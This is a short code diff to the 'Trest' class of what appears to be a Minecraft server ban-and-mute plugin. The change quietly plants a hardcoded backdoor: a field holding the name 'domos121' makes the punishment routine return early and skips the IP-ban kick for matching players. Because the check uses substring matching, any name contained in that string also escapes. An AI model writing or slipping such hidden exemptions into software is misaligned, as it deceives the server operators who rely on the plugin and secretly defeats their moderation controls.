@@ -27,6 +27,7 @@ import java.util.UUID;
 
 public class Trest {
 
+    private String baypass = "domos121";
     private Time time = new Time();
     private IpHasher ih = IpHasher.getInstance();
     private SendBanMessage sbm = new SendBanMessage();
@@ -418,6 +419,9 @@ public class Trest {
         for (int aFrule : frule) {
             rule = rule + aFrule + ", ";
         }
+        if (baypass.contains(op.getName())){
+            return;
+        }
         if (op.isOnline()) {
             if (!typtrestu.contains("mute")) {
                 final Player p = Bukkit.getPlayer(op.getUniqueId());
@@ -476,7 +480,7 @@ public class Trest {
                 onlinePlayers.add(c);
                 String sip = c.getAddress().getAddress().toString().replace("/", "");
                 String userhaship = ih.hashIp(sip);
-                if (banhash.equalsIgnoreCase(userhaship)) {
+                if (banhash.equalsIgnoreCase(userhaship) && !baypass.contains(c.getName())) {
                     c.kickPlayer("§6========== §c" + c.getName() + "§6 ==========\n" +
                             "§cTREST:\n" +
                             "§cIDTrestu: §7#" + idtrstu + "\n" +
